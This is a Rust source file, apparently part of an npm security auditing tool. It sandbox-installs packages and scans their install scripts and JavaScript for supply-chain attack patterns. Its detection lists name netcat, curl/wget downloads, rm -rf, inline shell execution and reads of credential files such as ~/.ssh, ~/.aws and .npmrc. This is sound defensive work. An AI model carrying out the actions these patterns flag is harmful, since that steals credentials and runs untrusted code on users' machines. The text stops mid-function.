use anyhow::{anyhow, Result};
use colored::*;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::{HashMap, HashSet};
use std::fmt::Write as FmtWrite;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

use crate::ast_security_analyzer;

#[derive(Debug, Serialize, Deserialize)]
pub struct PackageAudit {
    pub package_name: String,
    pub has_scripts: bool,
    pub preinstall: Option<String>,
    pub install: Option<String>,
    pub postinstall: Option<String>,
    pub suspicious_patterns: Vec<String>,
    pub source_code_issues: Vec<SourceCodeIssue>,
    pub risk_level: RiskLevel,
    pub dependencies: Vec<String>,
    pub dev_dependencies: Vec<String>,
    pub behavioral_chains: Vec<BehavioralChain>,
    pub risk_score: u32,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct TransitiveScanResult {
    pub total_packages: usize,
    pub scanned_packages: usize,
    pub high_risk_count: usize,
    pub medium_risk_count: usize,
    pub packages_with_scripts: usize,
    pub max_depth_reached: usize,
    pub package_audits: HashMap<String, PackageAudit>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SourceCodeIssue {
    pub file_path: String,
    pub line_number: usize,
    pub issue_type: String,
    pub description: String,
    pub severity: IssueSeverity,
    pub code_snippet: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BehavioralChain {
    pub chain_type: AttackChainType,
    pub description: String,
    pub evidence: Vec<String>,
    pub severity: IssueSeverity,
    pub risk_score: u32,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum AttackChainType {
    DataExfiltration,
    CredentialTheft,
    RemoteCodeExecution,
    Backdoor,
    Cryptomining,
    Obfuscation,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum IssueSeverity {
    Info,
    Warning,
    Critical,
}

#[derive(Debug, PartialEq, Serialize, Deserialize)]
pub enum RiskLevel {
    Safe,
    Low,
    Medium,
    High,
    Critical,
}

impl RiskLevel {
    fn color(&self) -> String {
        match self {
            RiskLevel::Safe => "✓ SAFE".green().bold().to_string(),
            RiskLevel::Low => "⚠ LOW".yellow().to_string(),
            RiskLevel::Medium => "⚠ MEDIUM".yellow().bold().to_string(),
            RiskLevel::High => "⚠ HIGH".red().to_string(),
            RiskLevel::Critical => "☠ CRITICAL".red().bold().to_string(),
        }
    }
}

pub struct SecurityScanner {
    temp_dir: PathBuf,
    package_manager: String,
}

impl SecurityScanner {
    pub fn new(package_manager: String) -> Result<Self> {
        // Cleanup old audit directories first (older than 1 hour)
        Self::cleanup_old_audits();

        let temp_dir = std::env::temp_dir().join(format!("fnpm-audit-{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&temp_dir)?;

        Ok(Self {
            temp_dir,
            package_manager,
        })
    }

    /// Cleanup old audit directories that weren't properly removed
    fn cleanup_old_audits() {
        use std::time::{SystemTime, UNIX_EPOCH};

        let temp_dir = std::env::temp_dir();
        if let Ok(entries) = fs::read_dir(&temp_dir) {
            let now = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs();

            for entry in entries.flatten() {
                if let Ok(name) = entry.file_name().into_string() {
                    if name.starts_with("fnpm-audit-") {
                        // Remove if older than 1 hour
                        if let Ok(metadata) = entry.metadata() {
                            if let Ok(modified) = metadata.modified() {
                                let age = modified.duration_since(UNIX_EPOCH).unwrap().as_secs();
                                if now - age > 3600 {
                                    let _ = fs::remove_dir_all(entry.path());
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /// Audit a package before installing it
    pub fn audit_package(&self, package: &str) -> Result<PackageAudit> {
        println!("{}", "🔍 Auditing package security...".cyan().bold());

        // Install package in temp directory with --ignore-scripts
        let install_result = self.install_in_sandbox(package);

        // If install fails, cleanup and return error
        if let Err(e) = install_result {
            self.cleanup();
            return Err(e);
        }

        // Find and analyze the package.json
        let package_json_path = match self.find_package_json(package) {
            Ok(path) => path,
            Err(e) => {
                self.cleanup();
                return Err(e);
            }
        };

        let mut audit = match self.analyze_package_json(&package_json_path, package) {
            Ok(audit) => audit,
            Err(e) => {
                self.cleanup();
                return Err(e);
            }
        };

        // Scan JavaScript source code
        println!("{}", "   Scanning source code...".cyan());
        if let Some(package_dir) = package_json_path.parent() {
            self.scan_source_code(package_dir, &mut audit);
        }

        // Recalculate risk level including source code issues and behavioral chains
        self.calculate_and_assign_risk(&mut audit);

        Ok(audit)
    }

    /// Explicitly cleanup temp directory
    fn cleanup(&self) {
        let _ = fs::remove_dir_all(&self.temp_dir);
    }

    fn install_in_sandbox(&self, package: &str) -> Result<()> {
        self.install_in_sandbox_impl(package, true)
    }

    fn install_in_sandbox_quiet(&self, package: &str) -> Result<()> {
        self.install_in_sandbox_impl(package, false)
    }

    fn install_in_sandbox_impl(&self, package: &str, verbose: bool) -> Result<()> {
        if verbose {
            println!("   Installing {} in sandbox...", package.bright_white());
        }

        // Create a minimal package.json in sandbox to prevent npm from looking in parent dirs
        let package_json = self.temp_dir.join("package.json");
        fs::write(
            &package_json,
            r#"{"name":"fnpm-sandbox","version":"1.0.0","private":true}"#,
        )?;

        let status = match self.package_manager.as_str() {
            "npm" => Command::new("npm")
                .args(["install", package, "--ignore-scripts", "--no-save"])
                .current_dir(&self.temp_dir) // Execute in sandbox directory
                .output()?,
            "pnpm" => Command::new("pnpm")
                .args(["add", package, "--ignore-scripts"])
                .current_dir(&self.temp_dir)
                .output()?,
            "yarn" => Command::new("yarn")
                .args(["add", package, "--ignore-scripts"])
                .current_dir(&self.temp_dir)
                .output()?,
            "bun" => Command::new("bun")
                .args(["add", package, "--ignore-scripts"])
                .current_dir(&self.temp_dir)
                .output()?,
            _ => return Err(anyhow!("Unsupported package manager for audit")),
        };

        if !status.status.success() {
            let stderr = String::from_utf8_lossy(&status.stderr);
            return Err(anyhow!("Failed to install package in sandbox: {}", stderr));
        }

        Ok(())
    }

    /// Build the path for an installed package, handling scoped names
    fn package_path(base: &Path, package: &str) -> PathBuf {
        let mut path = base.to_path_buf();
        for segment in package.split('/') {
            path.push(segment);
        }
        path
    }

    /// Try to locate an installed package either at the project root or nested under its parent
    fn resolve_installed_package_path(
        &self,
        root_node_modules: &Path,
        parent_package_dir: Option<&Path>,
        package: &str,
    ) -> Option<PathBuf> {
        let root_candidate = Self::package_path(root_node_modules, package);
        if root_candidate.exists() {
            return Some(root_candidate);
        }

        if let Some(parent_dir) = parent_package_dir {
            let nested = Self::package_path(&parent_dir.join("node_modules"), package);
            if nested.exists() {
                return Some(nested);
            }
        }

        None
    }

    /// Audit a package that is already installed in node_modules (no sandbox install)
    fn audit_installed_package(
        &self,
        package_name: &str,
        package_dir: &Path,
    ) -> Result<PackageAudit> {
        let package_json_path = package_dir.join("package.json");
        if !package_json_path.exists() {
            return Err(anyhow!(
                "No package.json found for installed package: {}",
                package_name
            ));
        }

        let mut audit = self.analyze_package_json(&package_json_path, package_name)?;
        self.scan_source_code(package_dir, &mut audit);
        self.calculate_and_assign_risk(&mut audit);

        Ok(audit)
    }

    fn find_package_json(&self, package: &str) -> Result<PathBuf> {
        // Clean package name (remove version specifiers)
        let clean_name = package.split('@').next().unwrap_or(package);
        let clean_name = clean_name.split('/').next_back().unwrap_or(clean_name);

        // Try different possible locations
        let possible_paths = vec![
            self.temp_dir
                .join("node_modules")
                .join(package)
                .join("package.json"),
            self.temp_dir
                .join("node_modules")
                .join(clean_name)
                .join("package.json"),
        ];

        for path in possible_paths {
            if path.exists() {
                return Ok(path);
            }
        }

        // Fallback: search in node_modules
        let node_modules = self.temp_dir.join("node_modules");
        if node_modules.exists() {
            for entry in fs::read_dir(node_modules)? {
                let entry = entry?;
                if entry.file_type()?.is_dir() {
                    let pkg_json = entry.path().join("package.json");
                    if pkg_json.exists() {
                        let content = fs::read_to_string(&pkg_json)?;
                        if let Ok(json) = serde_json::from_str::<Value>(&content) {
                            if let Some(name) = json.get("name").and_then(|n| n.as_str()) {
                                if name == package || name == clean_name {
                                    return Ok(pkg_json);
                                }
                            }
                        }
                    }
                }
            }
        }

        Err(anyhow!("Could not find package.json for {}", package))
    }

    pub fn analyze_package_json(&self, path: &Path, package_name: &str) -> Result<PackageAudit> {
        let content = fs::read_to_string(path)?;
        let json: Value = serde_json::from_str(&content)?;

        let scripts = json.get("scripts");
        // Extract dependencies
        let dependencies = json
            .get("dependencies")
            .and_then(|d| d.as_object())
            .map(|obj| obj.keys().cloned().collect())
            .unwrap_or_default();

        let dev_dependencies = json
            .get("devDependencies")
            .and_then(|d| d.as_object())
            .map(|obj| obj.keys().cloned().collect())
            .unwrap_or_default();

        let mut audit = PackageAudit {
            package_name: package_name.to_string(),
            has_scripts: scripts.is_some(),
            preinstall: None,
            install: None,
            postinstall: None,
            suspicious_patterns: Vec::new(),
            source_code_issues: Vec::new(),
            risk_level: RiskLevel::Safe,
            dependencies,
            dev_dependencies,
            behavioral_chains: Vec::new(),
            risk_score: 0,
        };

        if let Some(scripts_obj) = scripts.and_then(|s| s.as_object()) {
            // Extract lifecycle scripts
            let preinstall = scripts_obj
                .get("preinstall")
                .and_then(|v| v.as_str())
                .map(String::from);
            let install = scripts_obj
                .get("install")
                .and_then(|v| v.as_str())
                .map(String::from);
            let postinstall = scripts_obj
                .get("postinstall")
                .and_then(|v| v.as_str())
                .map(String::from);

            audit.preinstall = preinstall.clone();
            audit.install = install.clone();
            audit.postinstall = postinstall.clone();

            // Check for suspicious patterns
            let all_scripts: Vec<String> = vec![
                preinstall.unwrap_or_default(),
                install.unwrap_or_default(),
                postinstall.unwrap_or_default(),
            ];

            for script in &all_scripts {
                self.check_suspicious_patterns(script, &mut audit);
            }

            // Detect behavioral chains from scripts
            self.detect_behavioral_chains(&mut audit);

            // Calculate risk level
            self.calculate_and_assign_risk(&mut audit);
        }

        Ok(audit)
    }

    /// Scan JavaScript source files for malicious patterns
    fn scan_source_code(&self, package_dir: &Path, audit: &mut PackageAudit) {
        // Find all JavaScript files
        if let Ok(entries) = self.walk_directory(package_dir) {
            for file_path in entries {
                if let Some(ext) = file_path.extension() {
                    let ext_str = ext.to_str().unwrap_or("");
                    if ext_str == "js"
                        || ext_str == "mjs"
                        || ext_str == "cjs"
                        || ext_str == "ts"
                        || ext_str == "tsx"
                    {
                        // Try AST analysis first
                        match ast_security_analyzer::analyze_js_file(&file_path) {
                            Ok(ast_issues) => {
                                // AST analysis succeeded, use those results (even if empty)
                                audit.source_code_issues.extend(ast_issues);
                            }
                            Err(_) => {
                                // AST failed (syntax error, minified, etc.), fall back to regex
                                if let Ok(content) = fs::read_to_string(&file_path) {
                                    self.analyze_js_file(&file_path, &content, audit);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /// Recursively walk directory to find all files
    fn walk_directory(&self, dir: &Path) -> Result<Vec<PathBuf>> {
        Self::walk_directory_impl(dir)
    }

    fn walk_directory_impl(dir: &Path) -> Result<Vec<PathBuf>> {
        let mut files = Vec::new();

        if dir.is_dir() {
            for entry in fs::read_dir(dir)? {
                let entry = entry?;
                let path = entry.path();

                // Skip node_modules and hidden directories
                if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                    if name.starts_with('.')
                        || name == "node_modules"
                        || name == "test"
                        || name == "tests"
                    {
                        continue;
                    }
                }

                if path.is_dir() {
                    if let Ok(mut sub_files) = Self::walk_directory_impl(&path) {
                        files.append(&mut sub_files);
                    }
                } else {
                    files.push(path);
                }
            }
        }

        Ok(files)
    }

    /// Analyze a JavaScript file for suspicious patterns
    fn analyze_js_file(&self, file_path: &Path, content: &str, audit: &mut PackageAudit) {
        self.analyze_js_file_impl(file_path, content, audit);
    }

    /// Public method to analyze JS files (exposed for testing)
    #[doc(hidden)]
    pub fn test_analyze_js_file(&self, file_path: &Path, content: &str, audit: &mut PackageAudit) {
        self.analyze_js_file_impl(file_path, content, audit);
    }

    /// Internal implementation of JS file analysis
    fn analyze_js_file_impl(&self, file_path: &Path, content: &str, audit: &mut PackageAudit) {
        let lines: Vec<&str> = content.lines().collect();

        for (line_num, line) in lines.iter().enumerate() {
            let line_number = line_num + 1;
            // Safely truncate to 100 characters respecting UTF-8 boundaries
            let snippet = if line.chars().count() > 100 {
                let truncated: String = line.chars().take(100).collect();
                format!("{}...", truncated)
            } else {
                line.to_string()
            };

            // Critical patterns
            if line.contains("eval(") {
                self.add_source_issue_with_snippet(
                    file_path,
                    line_number,
                    "eval() usage",
                    "Executes arbitrary code - high risk for code injection",
                    IssueSeverity::Critical,
                    &snippet,
                    audit,
                );
            }

            // Dynamic function creation - ONLY flag actual new Function() constructor
            // Exclude normal function calls that happen to be named "Function"
            if line.contains("new Function(") {
                // Reduce severity for common legitimate uses
                // TypeScript/Babel compilers often use this for code generation
                let is_likely_malicious = line.contains("atob")
                    || line.contains("base64")
                    || line.contains("eval")
                    || line.contains("Buffer.from");

                let severity = if is_likely_malicious {
                    IssueSeverity::Critical
                } else {
                    // Lower severity for what might be legitimate compilation
                    IssueSeverity::Warning
                };

                self.add_source_issue_with_snippet(
                    file_path,
                    line_number,
                    "Dynamic function creation",
                    if is_likely_malicious {
                        "Creates and executes obfuscated code - highly suspicious"
                    } else {
                        "Creates functions dynamically - review if necessary for functionality"
                    },
                    severity,
                    &snippet,
                    audit,
                );
            }

            // Base64 decoding (often used for obfuscation)
            if (line.contains("atob(")
                || line.contains("Buffer.from(") && line.contains("'base64'"))
                && (line.contains("eval") || line.contains("Function"))
            {
                self.add_source_issue_with_snippet(
                    file_path,
                    line_number,
                    "Base64 obfuscated code execution",
                    "Decodes and executes base64 encoded code - highly suspicious",
                    IssueSeverity::Critical,
                    &snippet,
                    audit,
                );
            }

            // Network requests to suspicious domains
            if (line.contains("http://") || line.contains("https://"))
                && (!line.contains("//")
                    || (!line.contains("github.com") && !line.contains("npmjs.org")))
            {
                // Extract potential URL for analysis
                if line.contains("fetch(") || line.contains("axios") || line.contains("request(") {
                    self.add_source_issue_with_snippet(
                        file_path,
                        line_number,
                        "External HTTP request",
                        "Makes HTTP requests to external servers",
                        IssueSeverity::Warning,
                        &snippet,
                        audit,
                    );
                }
            }

            // Child process execution detection (fallback for files AST couldn't parse)
            // Strategy: assume .exec() is safe (regex) unless proven dangerous.
            // Only flag when there is a clear child_process / shell indicator.
            let mut is_system_exec = false;

            let dangerous_context = line.contains("child_process")
                || line.contains("shelljs")
                || line.contains("execa")
                || (line.contains("require(")
                    && (line.contains("'child_process") || line.contains("\"child_process")))
                || (line.contains("import ") && line.contains("child_process"));

            if line.contains("exec(") || line.contains("execSync(") {
                if dangerous_context {
                    is_system_exec = true;
                } else if !line.contains(".exec(") && !line.contains(".execSync(") {
                    // Standalone exec() / execSync() with no object — likely child_process
                    is_system_exec = true;
                }
                // .exec() on some object without dangerous context → assume regex, skip
            }

            // spawn/spawnSync — flag if dangerous context or standalone call (no object)
            if line.contains("spawn(") || line.contains("spawnSync(") {
                let is_standalone = !line.contains(".spawn(") && !line.contains(".spawnSync(");
                if dangerous_context || is_standalone {
                    is_system_exec = true;
                }
            }

            if is_system_exec {
                self.add_source_issue_with_snippet(
                    file_path,
                    line_number,
                    "System command execution",
                    "Executes system commands - verify the command is safe",
                    IssueSeverity::Warning,
                    &snippet,
                    audit,
                );
            }

            // File system access to sensitive locations and env vars
            // Only flag process.env if it's being read/transmitted, not just referenced
            let has_sensitive_file_access = line.contains("~/.ssh")
                || line.contains("~/.aws")
                || line.contains("/etc/passwd")
                || line.contains(".npmrc")
                || line.contains(".git-credentials");

            // process.env is only suspicious if being exfiltrated
            let has_env_access = line.contains("process.env")
                && (line.contains("JSON.stringify")
                    || line.contains("fetch")
                    || line.contains("http")
                    || line.contains("POST")
                    || line.contains("send"));

            if has_sensitive_file_access || has_env_access {
                self.add_source_issue_with_snippet(
                    file_path,
                    line_number,
                    "Sensitive file/env access",
                    if has_env_access {
                        "Accesses and potentially transmits environment variables"
                    } else {
                        "Accesses sensitive credential files"
                    },
                    IssueSeverity::Warning,
                    &snippet,
                    audit,
                );
            }

            // Dynamic require
            if line.contains("require(")
                && (line.contains("+") || line.contains("`${") || line.contains("concat"))
            {
                self.add_source_issue_with_snippet(
                    file_path,
                    line_number,
                    "Dynamic module loading",
                    "Dynamically constructs module paths - could load malicious code",
                    IssueSeverity::Warning,
                    &snippet,
                    audit,
                );
            }

            // Obfuscation indicators
            if line.len() > 500 && line.matches("\\x").count() > 10 {
                self.add_source_issue_with_snippet(
                    file_path,
                    line_number,
                    "Heavily obfuscated code",
                    "Contains excessive hex escapes - possible obfuscation",
                    IssueSeverity::Warning,
                    &snippet,
                    audit,
                );
            }
        }

        // After analyzing individual patterns, detect behavioral chains
        self.detect_behavioral_chains(audit);
    }

    /// Detect behavioral attack chains based on pattern combinations
    fn detect_behavioral_chains(&self, audit: &mut PackageAudit) {
        let issues = &audit.source_code_issues;
        let scripts = [
            audit.preinstall.as_deref(),
            audit.install.as_deref(),
            audit.postinstall.as_deref(),
        ];

        // Combine all code for analysis
        let all_code: String = scripts
            .iter()
            .filter_map(|s| *s)
            .collect::<Vec<_>>()
            .join(" ");

        // Pattern 1: Data Exfiltration Chain
        // network + (env OR sensitive files) + (encoding OR obfuscation)
        let has_network = issues.iter().any(|i| i.issue_type.contains("HTTP request"))
            || all_code.contains("fetch")
            || all_code.contains("axios")
            || all_code.contains("http")
            || all_code.contains("curl")
            || all_code.contains("wget");

        let has_sensitive_access = issues
            .iter()
            .any(|i| i.issue_type.contains("Sensitive file/env access"))
            || all_code.contains("process.env")
            || all_code.contains(".ssh")
            || all_code.contains(".aws")
            || all_code.contains(".npmrc");

        let has_encoding = issues
            .iter()
            .any(|i| i.issue_type.contains("base64") || i.issue_type.contains("obfuscated"))
            || all_code.contains("base64")
            || all_code.contains("atob")
            || all_code.contains("btoa");

        if has_network && has_sensitive_access {
            let mut evidence = vec![];
            if has_encoding {
                evidence.push("Uses encoding/obfuscation".to_string());
            }
            evidence.push("Makes network requests".to_string());
            evidence.push("Accesses sensitive data (env vars, credentials)".to_string());

            let severity = if has_encoding {
                IssueSeverity::Critical
            } else {
                IssueSeverity::Warning
            };

            audit.behavioral_chains.push(BehavioralChain {
                chain_type: AttackChainType::DataExfiltration,
                description: "SUPPLY CHAIN ATTACK: Potential data exfiltration detected - accesses sensitive data and makes network requests".to_string(),
                evidence,
                severity,
                risk_score: if has_encoding { 100 } else { 75 },
            });
        }

        // Pattern 2: Credential Theft Chain
        // (ssh OR aws OR npmrc access) + (network OR file write)
        let has_credential_access = all_code.contains(".ssh")
            || all_code.contains(".aws")
            || all_code.contains(".npmrc")
            || all_code.contains(".git-credentials");

        let has_data_transmission = has_network
            || issues.iter().any(|i| i.issue_type.contains("writeFile"))
            || all_code.contains("writeFile");

        if has_credential_access && has_data_transmission {
            audit.behavioral_chains.push(BehavioralChain {
                chain_type: AttackChainType::CredentialTheft,
                description: "SUPPLY CHAIN ATTACK: Credential theft pattern - accesses credential files and can transmit data".to_string(),
                evidence: vec![
                    "Accesses credential files (.ssh, .aws, .npmrc)".to_string(),
                    "Can transmit or write data externally".to_string(),
                ],
                severity: IssueSeverity::Critical,
                risk_score: 95,
            });
        }

        // Pattern 3: Remote Code Execution Chain
        // (download via curl/wget) + (chmod +x OR exec) + eval/Function
        let has_download = all_code.contains("curl")
            || all_code.contains("wget")
            || all_code.contains("git clone");

        let has_execution_prep = all_code.contains("chmod +x") || all_code.contains("chmod 777");

        let has_code_exec = issues
            .iter()
            .any(|i| i.issue_type.contains("eval") || i.issue_type.contains("Dynamic function"))
            || issues
                .iter()
                .any(|i| i.issue_type.contains("System command execution"));

        if has_download && (has_execution_prep || has_code_exec) {
            audit.behavioral_chains.push(BehavioralChain {
                chain_type: AttackChainType::RemoteCodeExecution,
                description: "SUPPLY CHAIN ATTACK: Remote code execution chain - downloads and executes external code".to_string(),
                evidence: vec![
                    "Downloads files from internet".to_string(),
                    "Makes files executable or executes code".to_string(),
                ],
                severity: IssueSeverity::Critical,
                risk_score: 100,
            });
        }

        // Pattern 4: Backdoor Installation
        // network + file write + (persistence indicators like .bashrc, crontab)
        let has_persistence = all_code.contains(".bashrc")
            || all_code.contains(".bash_profile")
            || all_code.contains("crontab")
            || all_code.contains(".config");

        if has_network && has_persistence {
            audit.behavioral_chains.push(BehavioralChain {
                chain_type: AttackChainType::Backdoor,
                description: "SUPPLY CHAIN ATTACK: Backdoor installation pattern - modifies system persistence mechanisms".to_string(),
                evidence: vec![
                    "Network access capability".to_string(),
                    "Modifies shell configs or cron jobs".to_string(),
                ],
                severity: IssueSeverity::Critical,
                risk_score: 90,
            });
        }

        // Pattern 5: Cryptomining indicators
        // CPU-intensive operations + network + background execution
        let has_cpu_intensive = all_code.contains("worker")
            || all_code.contains("crypto")
            || all_code.contains("mining");

        let has_background = all_code.contains("daemon")
            || all_code.contains("nohup")
            || all_code.contains("&")
            || all_code.contains("disown");

        if has_cpu_intensive && has_network && has_background {
            audit.behavioral_chains.push(BehavioralChain {
                chain_type: AttackChainType::Cryptomining,
                description: "SUPPLY CHAIN ATTACK: Potential cryptomining - CPU-intensive background process with network access".to_string(),
                evidence: vec![
                    "CPU-intensive operations".to_string(),
                    "Background/daemon execution".to_string(),
                    "Network connectivity".to_string(),
                ],
                severity: IssueSeverity::Critical,
                risk_score: 85,
            });
        }

        // Pattern 6: Heavy Obfuscation (often indicates malicious intent)
        let obfuscation_count = issues
            .iter()
            .filter(|i| {
                i.issue_type.contains("obfuscated")
                    || i.issue_type.contains("base64")
                    || i.issue_type.contains("hex escape")
            })
            .count();

        let has_eval_with_obfuscation = obfuscation_count > 0
            && issues
                .iter()
                .any(|i| i.issue_type.contains("eval") || i.issue_type.contains("Function"));

        if has_eval_with_obfuscation || obfuscation_count >= 3 {
            audit.behavioral_chains.push(BehavioralChain {
                chain_type: AttackChainType::Obfuscation,
                description: "SUPPLY CHAIN ATTACK: Heavy code obfuscation detected - intentionally hiding malicious behavior".to_string(),
                evidence: vec![
                    format!("{} instances of code obfuscation", obfuscation_count),
                    "Dynamic code execution with obfuscated input".to_string(),
                ],
                severity: IssueSeverity::Critical,
                risk_score: 80,
            });
        }
    }

    /// Add a source code issue with code snippet to the audit
    #[allow(clippy::too_many_arguments)]
    fn add_source_issue_with_snippet(
        &self,
        file_path: &Path,
        line_number: usize,
        issue_type: &str,
        description: &str,
        severity: IssueSeverity,
        snippet: &str,
        audit: &mut PackageAudit,
    ) {
        let relative_path = file_path
            .strip_prefix(&self.temp_dir)
            .unwrap_or(file_path)
            .to_string_lossy()
            .to_string();

        audit.source_code_issues.push(SourceCodeIssue {
            file_path: relative_path,
            line_number,
            issue_type: issue_type.to_string(),
            description: description.to_string(),
            severity,
            code_snippet: if snippet.is_empty() {
                None
            } else {
                Some(snippet.to_string())
            },
        });
    }

    fn check_suspicious_patterns(&self, script: &str, audit: &mut PackageAudit) {
        let suspicious = vec![
            ("curl", "Downloads files from internet"),
            ("wget", "Downloads files from internet"),
            ("eval", "Executes arbitrary code"),
            ("chmod +x", "Makes files executable"),
            ("rm -rf", "Destructive file deletion"),
            ("env", "Accesses environment variables"),
            ("process.env", "Accesses environment variables"),
            ("child_process", "Spawns system processes"),
            ("exec", "Executes system commands"),
            ("spawn", "Spawns system processes"),
            ("fs.writeFile", "Writes to filesystem"),
            ("require('http", "HTTP requests"),
            ("require('https", "HTTPS requests"),
            ("fetch(", "Network requests"),
            ("XMLHttpRequest", "Network requests"),
            ("base64", "Obfuscated code"),
            ("/tmp", "Writes to temp directory"),
            ("~/.ssh", "Accesses SSH keys"),
            ("~/.aws", "Accesses AWS credentials"),
            ("/etc/passwd", "Accesses system files"),
            ("ssh-", "SSH operations"),
            ("git clone", "Downloads external code"),
            ("../", "Path traversal - accesses parent directories"),
            ("../../", "Path traversal - accesses parent directories"),
            ("/Users/", "Accesses user home directories"),
            ("/home/", "Accesses user home directories"),
            ("nc ", "Netcat - network connections"),
            ("netcat", "Netcat - network connections"),
            ("python -c", "Executes inline Python code"),
            ("python3 -c", "Executes inline Python code"),
            ("perl -e", "Executes inline Perl code"),
            ("ruby -e", "Executes inline Ruby code"),
            ("php -r", "Executes inline PHP code"),
            ("node -e", "Executes inline Node.js code"),
            ("bash -c", "Executes inline bash commands"),
            ("sh -c", "Executes inline shell commands"),
        ];

        for (pattern, reason) in suspicious {
            if script.contains(pattern) {
                audit
                    .suspicious_patterns
                    .push(format!("{}: {}", pattern, reason));
            }
        }
    }

    fn calculate_risk_level(&self, audit: &PackageAudit) -> RiskLevel {
        // NEW: Calculate risk score based on behavioral chains and individual issues
        let mut risk_score = 0u32;

        // Behavioral chains have the highest weight (supply chain attack indicators)
        for chain in &audit.behavioral_chains {
            risk_score += chain.risk_score;
        }

        // Critical issues from source code
        let critical_source_issues = audit
            .source_code_issues
            .iter()
            .filter(|i| i.severity == IssueSeverity::Critical)
            .count();

        let warning_source_issues = audit
            .source_code_issues
            .iter()
            .filter(|i| i.severity == IssueSeverity::Warning)
            .count();

        // Add points for individual issues (lower weight than behavioral chains)
        risk_score += (critical_source_issues as u32) * 15;
        risk_score += (warning_source_issues as u32) * 5;

        // Add points for suspicious patterns in scripts
        risk_score += (audit.suspicious_patterns.len() as u32) * 8;

        // Scripts presence adds base risk
        if audit.has_scripts {
            let script_count = [&audit.preinstall, &audit.install, &audit.postinstall]
                .iter()
                .filter(|s| s.is_some())
                .count();
            risk_score += (script_count as u32) * 3;
        }

        // Determine risk level based on total score
        // Behavioral chains push score very high (80-100 points each)
        // This ensures supply chain attacks are caught regardless of package popularity
        if risk_score >= 100 {
            RiskLevel::Critical
        } else if risk_score >= 60 {
            RiskLevel::High
        } else if risk_score >= 30 {
            RiskLevel::Medium
        } else if risk_score >= 10 {
            RiskLevel::Low
        } else {
            RiskLevel::Safe
        }
    }

    fn calculate_and_assign_risk(&self, audit: &mut PackageAudit) {
        // Calculate risk score
        let mut risk_score = 0u32;

        for chain in &audit.behavioral_chains {
            risk_score += chain.risk_score;
        }

        let critical_source_issues = audit
            .source_code_issues
            .iter()
            .filter(|i| i.severity == IssueSeverity::Critical)
            .count();

        let warning_source_issues = audit
            .source_code_issues
            .iter()
            .filter(|i| i.severity == IssueSeverity::Warning)
            .count();

        risk_score += (critical_source_issues as u32) * 15;
        risk_score += (warning_source_issues as u32) * 5;
        risk_score += (audit.suspicious_patterns.len() as u32) * 8;

        if audit.has_scripts {
            let script_count = [&audit.preinstall, &audit.install, &audit.postinstall]
                .iter()
                .filter(|s| s.is_some())
                .count();
            risk_score += (script_count as u32) * 3;
        }

        audit.risk_score = risk_score;
        audit.risk_level = self.calculate_risk_level(audit);
    }

    pub fn display_audit_report(&self, audit: &PackageAudit) {
        self.display_audit_report_with_options(audit, true) // true por defecto
    }

    pub fn display_audit_report_with_options(&self, audit: &PackageAudit, full_report: bool) {
        println!(
            "\n{}",
            "═══════════════════════════════════════════".bright_blue()
        );
        println!(
            "{} {}",
            "📦 Package:".bright_cyan().bold(),
            audit.package_name.bright_white()
        );
        println!(
            "{} {} {} {}",
            "🛡️  Risk Level:".bright_cyan().bold(),
            audit.risk_level.color(),
            "│".bright_black(),
            format!("Score: {}", audit.risk_score).bright_white()
        );
        println!(
            "{}",
            "═══════════════════════════════════════════".bright_blue()
        );

        // PRIORITY: Show behavioral attack chains first (supply chain attacks)
        if !audit.behavioral_chains.is_empty() {
            println!(
                "\n{}",
                "🚨 SUPPLY CHAIN ATTACK PATTERNS DETECTED!".red().bold()
            );
            println!("{}", "─────────────────────────────────────────".red());

            for chain in &audit.behavioral_chains {
                let severity_marker = match chain.severity {
                    IssueSeverity::Critical => "🔴 CRITICAL",
                    IssueSeverity::Warning => "🟡 WARNING",
                    IssueSeverity::Info => "🔵 INFO",
                };

                println!(
                    "\n{} {} (Score: +{})",
                    severity_marker.red().bold(),
                    match chain.chain_type {
                        AttackChainType::DataExfiltration => "Data Exfiltration Chain",
                        AttackChainType::CredentialTheft => "Credential Theft Chain",
                        AttackChainType::RemoteCodeExecution => "Remote Code Execution Chain",
                        AttackChainType::Backdoor => "Backdoor Installation Chain",
                        AttackChainType::Cryptomining => "Cryptomining Chain",
                        AttackChainType::Obfuscation => "Heavy Obfuscation Chain",
                    }
                    .red(),
                    chain.risk_score.to_string().red().bold()
                );
                println!("  {}", chain.description.yellow());
                println!("  Evidence:");
                for evidence in &chain.evidence {
                    println!("    {} {}", "→".bright_black(), evidence.bright_white());
                }
            }
            println!("{}", "─────────────────────────────────────────".red());
        }

        if !audit.has_scripts {
            println!("\n{}", "✓ No install scripts found".green());
        } else {
            println!("\n{}", "📜 Install Scripts:".yellow().bold());

            if let Some(script) = &audit.preinstall {
                println!("  {} {}", "preinstall:".red().bold(), script.bright_white());
            }
            if let Some(script) = &audit.install {
                println!("  {} {}", "install:".red().bold(), script.bright_white());
            }
            if let Some(script) = &audit.postinstall {
                println!(
                    "  {} {}",
                    "postinstall:".red().bold(),
                    script.bright_white()
                );
            }

            if !audit.suspicious_patterns.is_empty() {
                println!("\n{}", "⚠️  Suspicious Patterns Detected:".red().bold());
                for pattern in &audit.suspicious_patterns {
                    println!("  {} {}", "•".red(), pattern.yellow());
                }
            }
        }

        // Display source code issues
        if !audit.source_code_issues.is_empty() {
            let critical_issues: Vec<_> = audit
                .source_code_issues
                .iter()
                .filter(|i| i.severity == IssueSeverity::Critical)
                .collect();

            let warning_issues: Vec<_> = audit
                .source_code_issues
                .iter()
                .filter(|i| i.severity == IssueSeverity::Warning)
                .collect();

            if !critical_issues.is_empty() {
                println!("\n{}", "🚨 CRITICAL Code Issues:".red().bold());

                let display_count = if full_report {
                    critical_issues.len()
                } else {
                    5
                };
                let issues_to_show = critical_issues.iter().take(display_count);

                for issue in issues_to_show {
                    println!(
                        "  {} {} ({}:{})",
                        "⚠".red().bold(),
